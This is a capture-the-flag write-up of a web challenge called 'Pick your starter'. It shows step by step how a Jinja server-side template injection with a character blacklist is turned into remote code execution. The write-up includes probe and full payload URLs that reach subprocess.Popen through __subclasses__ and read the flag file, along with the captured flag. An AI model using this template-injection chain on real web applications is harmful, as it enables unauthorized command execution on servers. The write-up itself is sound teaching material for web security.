title: "Pick your starter"
---

In this challenge, we exploit a jinja template injection to get RCE.

<!--more-->

We have a website which displays pokemon

![Alt text](/assets/pctf/pick-your-starter-0.png)

The server header reports `Werkzeug` so we tried the `/console` endpoint. (checkout `debug=True` shell that `Werkzeug` offers and was behind the [2015 Patreon Hack](https://labs.detectify.com/2015/10/02/how-patreon-got-hacked-publicly-exposed-werkzeug-debugger/))

## Vulnerability

After some experimentation we discover that there is a **template injection attack**, let's see the result for `/{{7*6}}`

![Alt text](https://raw.githubusercontent.com/BasiliCS/writeups/pctf/pctf/web/pick-your-starter-2.png)

We also notice that many characters are blacklisted including `-+'"[]`.

Although this webpage is entertaining, for the rest of this challenge we will be using a python script with `BeautifulSoup` to extract the interesting text:

```py
import requests
from bs4 import BeautifulSoup
page = requests.get("http://chal.pctf.competitivecyber.club:5555/{{7*6}}")

soup = BeautifulSoup(page.content, "html.parser")

prefix_len = len("<h1>\"b'")
suffix_len = len("'\" isn't a starter Pok√©mon.</h1>")

extracted = str(soup.find_all("h1")[0])[prefix_len:-suffix_len]

print(extracted)
```

## Exploit

We would like to get RCE on the server. Given the black list, we are able to access a global object through `()` climbing to the base class `object` we are able to list all available classes with the `__subclasses__` method.

The URL looks like this:
`http://chal.pctf.competitivecyber.club:5555/{{().__class__.__base__.__subclasses__()}}`

The response looks like this (the final list is a lot longer):

```
"lt;class 'type'&gt;, &lt;class 'async_generator'&gt;, &lt;class 'bytearray_iterator'&gt;, &lt;class 'bytearray'&gt;, &lt;class 'bytes_iterator'&gt;, &lt;class 'bytes'&gt;, &lt;class 'builtin_function_or_method'&gt;, &lt;class 'callable_iterator'&gt;, &lt;
```

We are interested in the 455th element: `subprocess.Popen` as it will give us a shell.

We cannot use `[]` characters so we have to use the `__getitem__` method.

Finally, we want to pass our string command to the constructor, this can be easily done using `request.args.shell` and passing an argument `?shell=cat /flag.txt`.

The final URL:
`"http://chal.pctf.competitivecyber.club:5555/{{().__class__.__base__.__subclasses__().__getitem__(455)(request.args.shell,shell=True,stdout=(1).__neg__()).communicate()}}?shell=cat ../flag.txt"`

## The flag

`PCTF(wHOS7H47PoKEmoN)`
